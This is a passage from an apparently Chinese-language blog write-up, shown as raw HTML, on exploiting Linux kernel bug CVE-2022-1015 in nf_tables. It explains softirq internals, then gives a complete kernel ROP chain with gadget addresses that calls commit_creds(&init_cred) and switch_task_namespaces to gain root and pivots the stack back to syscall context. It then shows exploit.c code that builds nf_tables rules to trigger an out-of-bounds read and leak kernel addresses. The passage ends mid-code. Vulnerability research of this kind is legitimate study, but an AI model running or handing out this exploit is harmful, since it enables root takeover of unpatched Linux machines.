class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c">asmlinkage __visible <span class="hljs-type">void</span> <span class="hljs-title function_">do_softirq</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>__u32 pending;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><br>    <span class="hljs-comment">// [1]</span><br><span class="hljs-keyword">if</span> (in_interrupt())<br><span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-comment">// [2]</span><br>local_irq_save(flags);<br><br>    <span class="hljs-comment">// [3]</span><br>pending = local_softirq_pending();<br><br>    <span class="hljs-comment">// [4]</span><br><span class="hljs-keyword">if</span> (pending &amp;&amp; !ksoftirqd_running(pending))<br>do_softirq_own_stack();<br><br>    <span class="hljs-comment">// [5]</span><br>local_irq_restore(flags);<br>&#125;<br></code></pre></td></tr></table></figure><p>do_softirq_own_stack会在另外的栈上执行__do_softirq，栈顶如下图👇</p><img src="/2024/08/23/cve-2022-1015/return2syscall.png" class title="return2syscall"><p>__do_softirq流程</p><ul><li>通过取当前CPU上的__softirq_pending字段，获取当前CPU上挂起的软中断</li><li>清空本地CPU的__softirq_pending字段</li><li>开启本地CPU的硬中断</li><li>循环执行被挂起的软中断处理函数</li><li>处理input网络包的net_rx_action在这里执行</li><li>禁用本地CPU的硬中断</li><li>唤醒ksoftirq内核线程来处理软中断</li><li>调整preempt count，这个变量用于记录上下文，比如：软中断上下文、硬中断上下文</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c">asmlinkage __visible <span class="hljs-type">void</span> __softirq_entry __do_softirq(<span class="hljs-type">void</span>)<br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end = jiffies + MAX_SOFTIRQ_TIME;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> old_flags = current-&gt;flags;<br><span class="hljs-type">int</span> max_restart = MAX_SOFTIRQ_RESTART;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">softirq_action</span> *<span class="hljs-title">h</span>;</span><br><span class="hljs-type">bool</span> in_hardirq;<br>__u32 pending;<br><span class="hljs-type">int</span> softirq_bit;<br><br>current-&gt;flags &amp;= ~PF_MEMALLOC;<br><br>    <span class="hljs-comment">// [1]</span><br>pending = local_softirq_pending();<br><br>   <span class="hljs-comment">/* …… */</span><br>    <br>restart:<br><span class="hljs-comment">// [2]</span><br>set_softirq_pending(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// [3]</span><br>local_irq_enable();<br><span class="hljs-comment">// [4]</span><br>h = softirq_vec;<br><br><span class="hljs-keyword">while</span> ((softirq_bit = ffs(pending))) &#123;<br>        <br>        <span class="hljs-comment">/* …… */</span><br>        <br>trace_softirq_entry(vec_nr);<br>h-&gt;action(h);<span class="hljs-comment">// [5]</span><br>trace_softirq_exit(vec_nr);<br>        <br><span class="hljs-comment">/* …… */</span><br>        <br>pending &gt;&gt;= softirq_bit;<br>&#125;<br><br><span class="hljs-comment">/* …… */</span><br><br>    <span class="hljs-comment">// [6]</span><br>local_irq_disable();<br><br>    <span class="hljs-comment">// [7]</span><br>pending = local_softirq_pending();<br><span class="hljs-keyword">if</span> (pending) &#123;<br><span class="hljs-keyword">if</span> (time_before(jiffies, end) &amp;&amp; !need_resched() &amp;&amp;<br>    --max_restart)<br><span class="hljs-keyword">goto</span> restart;<br><br>wakeup_softirqd();<br>&#125;<br><br>account_softirq_exit(current);<br>lockdep_softirq_end(in_hardirq);<br>softirq_handle_end();<span class="hljs-comment">// [8]</span><br>current_restore_flags(old_flags, PF_MEMALLOC);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="离开softirq上下文"><a href="#离开softirq上下文" class="headerlink" title="离开softirq上下文"></a>离开softirq上下文</h5><p>需要模拟pending softirq处理完的流程</p><ul><li>调用local_irq_disable禁用硬中断</li><li>调用softirq_handle_end调整preempt count</li></ul><p>可以通过以下步骤模拟这一过程</p><ul><li>利用<code>cli; ret;</code>gadget来执行local_irq_disable</li><li>由于softirq_handle_end是内联实现，所以可以直接在__do_softirq中执行，跳过wakeup_softirq事务</li></ul><p>提权后再把栈抬至do_softirq栈顶就能优雅地回到syscall上下文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0xffffffff8200019a &lt;+410&gt;:   call   0xffffffff810a8f30 &lt;wakeup_softirqd&gt;<br>0xffffffff8200019f &lt;+415&gt;:   add    DWORD PTR gs:[rip+0x7e01f9d6],0xffffff00        # 0x1fb80 &lt;__preempt_count&gt;                                                                                    <br>0xffffffff820001aa &lt;+426&gt;:   mov    eax,DWORD PTR gs:[rip+0x7e01f9cf]        # 0x1fb80 &lt;__preempt_count&gt;                                                                                           <br>0xffffffff820001b1 &lt;+433&gt;:   test   eax,0xffff00<br>0xffffffff820001b6 &lt;+438&gt;:   jne    0xffffffff8200028b &lt;__do_softirq+651&gt;<br>0xffffffff820001bc &lt;+444&gt;:   mov    edx,DWORD PTR [rbp-0x4c]<br>0xffffffff820001bf &lt;+447&gt;:   mov    rax,QWORD PTR gs:0x1fbc0<br>0xffffffff820001c8 &lt;+456&gt;:   and    edx,0x800<br>0xffffffff820001ce &lt;+462&gt;:   and    DWORD PTR [rax+0x2c],0xfffff7ff<br>0xffffffff820001d5 &lt;+469&gt;:   or     DWORD PTR [rax+0x2c],edx<br>0xffffffff820001d8 &lt;+472&gt;:   add    rsp,0x28<br>0xffffffff820001dc &lt;+476&gt;:   pop    rbx<br>0xffffffff820001dd &lt;+477&gt;:   pop    r12<br>0xffffffff820001df &lt;+479&gt;:   pop    r13<br>0xffffffff820001e1 &lt;+481&gt;:   pop    r14<br>0xffffffff820001e3 &lt;+483&gt;:   pop    r15<br>0xffffffff820001e5 &lt;+485&gt;:   pop    rbp<br>0xffffffff820001e6 &lt;+486&gt;:   ret<br></code></pre></td></tr></table></figure><p>这里需要伪造rbp，确保rbp-0x58指向的值为0x400100</p><h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><p>提权步骤</p><ul><li>bpf_get_current_task获取当前进程的tack_struct current</li><li>switch_task_namespaces(current, &amp;init_nsproxy)</li><li>commit_creds(&amp;init_cred)</li><li>抬栈返回syscall上下文</li></ul><h4 id="ROP链"><a href="#ROP链" class="headerlink" title="ROP链"></a>ROP链</h4><p>之前计算出可以写23条gadget</p><ul><li><p>离开softirq上下文需要4条</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0xffffffff8106a918: cli; ret;<br>0xffffffff810006b7: pop rbp; ret;<br>0xffffffff822c1df2: &lt;serial_pci_tbl+4850&gt;:0x0000000040010000<br>0xffffffff8200019f: &lt;__do_softirq+415&gt;<br></code></pre></td></tr></table></figure></li><li><p>__do_softirq末尾的调栈需要11条填充</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0xffffffff820001d8 &lt;+472&gt;:   add    rsp,0x28<br>0xffffffff820001dc &lt;+476&gt;:   pop    rbx<br>0xffffffff820001dd &lt;+477&gt;:   pop    r12<br>0xffffffff820001df &lt;+479&gt;:   pop    r13<br>0xffffffff820001e1 &lt;+481&gt;:   pop    r14<br>0xffffffff820001e3 &lt;+483&gt;:   pop    r15<br>0xffffffff820001e5 &lt;+485&gt;:   pop    rbp<br>0xffffffff820001e6 &lt;+486&gt;:   ret<br></code></pre></td></tr></table></figure></li><li><p>还剩8条，但提权返回syscall上下文需要11条</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0xffffffff811ef7e0: bpf_get_current_task<br>0xffffffff8102bfb1: mov rdi, rax; mov eax, ebx; pop rbx; pop rbp; or rax, rdi; ret;<br>0xdeadbeef<br>0xdeadbeef<br>0xffffffff810223e6: pop rsi; ret;<br>0xffffffff8286d940:init_nsproxy<br>0xffffffff810d12b0:switch_task_namespaces<br>0xffffffff81092100: pop rdi; ret;<br>0xffffffff8286db80:init_cred<br>0xffffffff810d2690:commit_creds<br>0xffffffff8128e2c4: add rsp, 0xd8; pop r12; pop rbp; ret;<br></code></pre></td></tr></table></figure></li></ul><p>可以把提权的gadgets塞进__do_softirq末尾调栈的11条填充里，然后用8条gadget把栈搬过去</p><p><em>由于是自己重编的内核，所以现成的exp里有个gadget没有，自己重搓了一组，思路是一样的</em></p><p>大致思路</p><ul><li>通过push rsp再pop将rsp的值存入某个寄存器（如r13）</li><li>有可控寄存器rax（如pop rax; ret;）</li><li>sub r13, rax; ret;</li><li>再通过push r13; pop rsp;控制rsp</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0xffffffff814ec181: push rsp; and eax, 0x5c415b0c; pop r13; pop rbp; ret;<br>0xdeadbeef<br>0xffffffff81064650: pop rax; ret;<br>0x68<br>0xffffffff812847f9: sub r13, rax; mov rax, r13; pop r13; pop rbp; ret;<br>0xdeadbeef<br>0xdeadbeef<br>0xffffffff8164cfba: push rax; add eax, 0x74030000; add al, 0x41; pop rsp; pop rbp; ret;<br></code></pre></td></tr></table></figure><p>完整ROP链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-comment">// 0xffffffff8106a918: cli; ret;</span><br>_rop(kernel_base + CLI_OFF);<br><br>   <span class="hljs-comment">// make rbp-0x58 point to 0x40010000</span><br><span class="hljs-comment">// 0xffffffff810006b7: pop rbp; ret;</span><br>   _rop(kernel_base + POP_RBP_OFF);<br><span class="hljs-comment">// 0xffffffff822c1df2 &lt;serial_pci_tbl+4850&gt;:0x0000000040010000</span><br>   _rop(kernel_base + OLD_TASK_FLAGS_OFF + <span class="hljs-number">0x58</span>)<br>       <br>   <span class="hljs-comment">// Cleanly exit softirq and return to syscall context</span><br><span class="hljs-comment">// ffffffff82000000 T __do_softirq</span><br>   _rop(kernel_base + __DO_SOFTIRQ_OFF + <span class="hljs-number">415</span>);<br><br>   <span class="hljs-comment">// switch_task_namespaces(current, &amp;init_nsproxy)</span><br><span class="hljs-comment">// ffffffff811ef7e0 T bpf_get_current_task</span><br>   _rop(kernel_base + BPF_GET_CURRENT_TASK_OFF);<br><span class="hljs-comment">// 0xffffffff8102bfb1: mov rdi, rax; mov eax, ebx; pop rbx; pop rbp; or rax, rdi; ret;</span><br>   _rop(kernel_base + MOV_RDI_RAX_OFF);<br>   _rop(<span class="hljs-number">0xdeadbeef</span>);<br>   _rop(<span class="hljs-number">0xdeadbeef</span>);<br><span class="hljs-comment">// 0xffffffff810223e6: pop rsi; ret;</span><br>   _rop(kernel_base + POP_RSI_OFF);<br><span class="hljs-comment">// ffffffff8286d940 D init_nsproxy</span><br>   _rop(kernel_base + INIT_NSPROXY_OFF);<br><span class="hljs-comment">// ffffffff810d12b0 T switch_task_namespaces</span><br>   _rop(kernel_base + SWITCH_TASK_NAMESPACES_OFF);<br><br>   <span class="hljs-comment">// commit_cred(&amp;init_cred)</span><br><span class="hljs-comment">// 0xffffffff81092100: pop rdi; ret;</span><br>   _rop(kernel_base + POP_RDI_OFF);<br><span class="hljs-comment">// ffffffff8286db80 D init_cred</span><br>   _rop(kernel_base + INIT_CRED_OFF);<br><span class="hljs-comment">// ffffffff810d2690 T commit_creds</span><br>   _rop(kernel_base + COMMIT_CREDS_OFF);<br><br>   <span class="hljs-comment">// pass control to system call stack</span><br><span class="hljs-comment">// 0xffffffff8128e2c4 : add rsp, 0xd8 ; pop r12 ; pop rbp ; ret</span><br>   _rop(kernel_base + <span class="hljs-number">0x28e2c4</span>);<br><br><span class="hljs-comment">// jump to j1</span><br><span class="hljs-comment">// 0xffffffff814ec181 : push rsp ; and eax, 0x5c415b0c ; pop r13 ; pop rbp ; ret</span><br>   _rop(kernel_base + <span class="hljs-number">0x4ec181</span>);<br>   _rop(<span class="hljs-number">0xdeadbeef</span>);<br><span class="hljs-comment">// 0xffffffff81064650 : pop rax ; ret</span><br>   _rop(kernel_base + <span class="hljs-number">0x64650</span>);<br>   _rop(<span class="hljs-number">0x68</span>);<br><span class="hljs-comment">// 0xffffffff812847f9 : sub r13, rax ; mov rax, r13 ; pop r13 ; pop rbp ; ret</span><br>   _rop(kernel_base + <span class="hljs-number">0x2847f9</span>);<br>   _rop(<span class="hljs-number">0xdeadbeef</span>);<br>   _rop(<span class="hljs-number">0xdeadbeef</span>);<br><span class="hljs-comment">// 0xffffffff8164cfba : push rax ; add eax, 0x74030000 ; add al, 0x41 ; pop rsp ; pop rbp ; ret</span><br>   _rop(kernel_base + <span class="hljs-number">0x64cfba</span>);<br></code></pre></td></tr></table></figure><img src="/2024/08/23/cve-2022-1015/success.png" class title="success"><h1 id="一些尝试"><a href="#一些尝试" class="headerlink" title="一些尝试"></a>一些尝试</h1><h2 id="别的Leak方法"><a href="#别的Leak方法" class="headerlink" title="别的Leak方法"></a>别的Leak方法</h2><h3 id="nft-payload-set"><a href="#nft-payload-set" class="headerlink" title="nft_payload_set"></a>nft_payload_set</h3><p>在看源码的时候发现一个东西</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_payload_set</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_payload_bases</span><span class="hljs-title">base</span>:</span><span class="hljs-number">8</span>;<br>u8offset;<br>u8len;<br>u8sreg;<br>u8csum_type;<br>u8csum_offset;<br>u8csum_flags;<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr_ops</span> <span class="hljs-title">nft_payload_set_ops</span> =</span> &#123;<br>.type= &amp;nft_payload_type,<br>.size= NFT_EXPR_SIZE(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> nft_payload_set)),<br>.eval= nft_payload_set_eval,<br>.init= nft_payload_set_init,<br>.dump= nft_payload_set_dump,<br>.reduce= nft_payload_set_reduce,<br>&#125;;<br></code></pre></td></tr></table></figure><p>看源码像是可以把寄存器的值写入packet，nft_payload_select_ops中如果设置了sreg没设置dreg就会返回这个nft_payload_set_ops</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (tb[NFTA_PAYLOAD_SREG] != <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-keyword">if</span> (tb[NFTA_PAYLOAD_DREG] != <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span> ERR_PTR(-EINVAL);<br><span class="hljs-keyword">return</span> &amp;nft_payload_set_ops;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样我们就可以直接通过将栈上的值写进packet再读取来泄漏地址，不需要侧信道了</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><ul><li><p>exploit.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// create_infoleak_rule() —— create rule to leak and compare with cmp</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_infoleak_rule</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mnl_socket* nl, <span class="hljs-keyword">struct</span> nftnl_rule* r, <span class="hljs-type">uint16_t</span> family, <span class="hljs-type">int</span>* seq, <span class="hljs-type">int</span> extraflags)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vuln_expr_params</span> <span class="hljs-title">vuln_params</span>;</span><br><br><span class="hljs-comment">// index 0xff -&gt; offset 0x3fc, leak kernel address</span><br>    <span class="hljs-keyword">if</span> (calc_vuln_expr_params(&amp;vuln_params, <span class="hljs-number">0xf5</span>,  <span class="hljs-number">0x40</span>, <span class="hljs-number">0x40</span>)) <br>        error(<span class="hljs-string">&quot;Could not find correct params to trigger OOB read.&quot;</span>);<br><br><span class="hljs-comment">// shift by pos*8 -&gt; the first byte of the register will be leaked</span><br>    <span class="hljs-type">uint32_t</span> shift_amt = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// printf(&quot;min_len: 0x%x,   value:0x%x\n&quot;, vuln_params.min_len, vuln_params.value);</span><br>    rule_add_bit_shift(r, NFT_BITWISE_RSHIFT, vuln_params.min_len, vuln_params.value, <span class="hljs-number">1</span>, &amp;shift_amt, <span class="hljs-keyword">sizeof</span> shift_amt);<br>    <br><span class="hljs-comment">// 使用payload set将栈上地址写入packet，8字节</span><br>    rule_add_payload_set(r, NFT_PAYLOAD_INNER_HEADER, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0x15</span>);<br><br>    rule_add_immediate_verdict(r, NF_ACCEPT, <span class="hljs-literal">NULL</span>);<br><br>    send_batch_request(<br>        nl,<br>        NFT_MSG_NEWRULE | (NFT_TYPE_RULE &lt;&lt; <span class="hljs-number">8</span>),<br>        NLM_F_CREATE | extraflags, family, (<span class="hljs-type">void</span>**)&amp;r, seq,<br>        <span class="hljs-literal">NULL</span><br>    );<br>&#125;<br><span class="hljs-comment">// do_leak_byte() —— leak 1 byte</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INFOLEAK_RULE_HANDLE 4</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">do_leak_bytes</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mnl_socket* nl, <span class="hljs-type">int</span> client_sock, <span class="hljs-keyword">struct</span> sockaddr_in* addr, <span class="hljs-type">char</span>* table_name, <span class="hljs-type">char</span>* aux_chain_name, <span class="hljs-type">uint64_t</span>* p_leak, <span class="hljs-type">int</span>* seq)</span><br>&#123;<br>    <span class="hljs-type">char</span> msg[<span class="hljs-number">16</span>] = &#123;&#125;;<br>    <span class="hljs-type">char</span> result[<span class="hljs-number">16</span>] = &#123;&#125;;<br>    *(<span class="hljs-type">uint64_t</span>*)msg = MAGIC;<br><br><span class="hljs-comment">// 2. Create a rule that replaces the rule with handle INFOLEAK_RULE_HANDLE </span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nftnl_rule</span>* <span class="hljs-title">r</span> =</span> build_rule(table_name, aux_chain_name, NFPROTO_IPV4, <span class="hljs-literal">NULL</span>);<br>    nftnl_rule_set_u64(r, NFTNL_RULE_HANDLE, INFOLEAK_RULE_HANDLE);         <span class="hljs-comment">// ???</span><br>        <br><span class="hljs-comment">// 3. create_infoleak_rule() —— create rule to leak and compare with mid</span><br>    create_infoleak_rule(nl, r, NFPROTO_IPV4, seq, NLM_F_REPLACE);<br><span class="hljs-comment">// 4. trigger the above rule</span><br>    sendto(client_sock, msg, <span class="hljs-keyword">sizeof</span> msg, <span class="hljs-number">0</span>, (<span class="hljs-keyword">struct</span> sockaddr*)addr, <span class="hljs-keyword">sizeof</span> *addr);<br><span class="hljs-comment">// 5. judge the leak value range according to drop/accept the packet</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">presumed_server_addr</span>;</span><br>    <span class="hljs-type">socklen_t</span> presumed_server_addr_len = <span class="hljs-keyword">sizeof</span> presumed_server_addr;<br><br>    <span class="hljs-type">int</span> nrecv = recvfrom(client_sock, result, <span class="hljs-keyword">sizeof</span> result, <span class="hljs-number">0</span>, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;presumed_server_addr, &amp;presumed_server_addr_len);<br>    <span class="hljs-keyword">if</span> (!nrecv)<br>        error(<span class="hljs-string">&quot;[-] Remote socket closed...&quot;</span>);<br>    <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(result, msg)) <br>            error(<span class="hljs-string">&quot;[-] Something went wrong...&quot;</span>);<br>        *p_leak = *(<span class="hljs-type">uint64_t</span> *)result;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Leaked bytes: %llx\n&quot;</span>, *p_leak);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// do_leak() —— leak kernel base</span><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">do_leak</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mnl_socket* nl, <span class="hljs-keyword">struct</span> sockaddr_in* addr, <span class="hljs-type">char</span>* table_name, <span class="hljs-type">char</span>* aux_chain_name, <span class="hljs-type">int</span>* seq)</span><br>&#123;<br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> CLIENT_HOST <span class="hljs-string">&quot;127.0.0.1&quot;</span></span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> CLIENT_PORT 8888</span><br><br>    <span class="hljs-type">int</span> client_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">client_addr</span>;</span><br>    inet_aton(CLIENT_HOST, &amp;client_addr.sin_addr);<br>    client_addr.sin_port = htons(CLIENT_PORT);<br>    client_addr.sin_family = AF_INET;<br><br>    <span class="hljs-keyword">if</span> (bind(client_sock, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;client_addr, <span class="hljs-keyword">sizeof</span> client_addr) &lt; <span class="hljs-number">0</span>) <br>        error(<span class="hljs-string">&quot;client bind&quot;</span>);<br><br><span class="hljs-comment">// 1. set 100ms receive timeout (can probably be lower)</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timespec</span> <span class="hljs-title">t</span> =</span> &#123;.tv_sec =  <span class="hljs-number">0</span>, .tv_nsec = <span class="hljs-number">1000</span> * <span class="hljs-number">200</span>&#125;;<br>    setsockopt(client_sock, SOL_SOCKET, SO_RCVTIMEO, &amp;t, <span class="hljs-keyword">sizeof</span> t);<br><span class="hljs-comment">// 2. leak 8 bytes </span><br>    <span class="hljs-type">uint64_t</span> results;<br>    do_leak_bytes(nl, client_sock, addr, table_name, aux_chain_name, &amp;results, seq);<br>    <br>    close(client_sock);<br>    <span class="hljs-keyword">return</span> results;<br>&#125;<br><span class="hljs-comment">// leak_handler() —— polling to receive packet</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">leak_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">4096</span>] = &#123;&#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">client_addr</span> =</span> &#123;&#125;;<br>    <span class="hljs-type">socklen_t</span> client_addr_size = <span class="hljs-keyword">sizeof</span> client_addr;<br>    <span class="hljs-type">size_t</span> conn_id = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 把收到的数据发回去，这时候packet的内容已经被修改了</span><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span 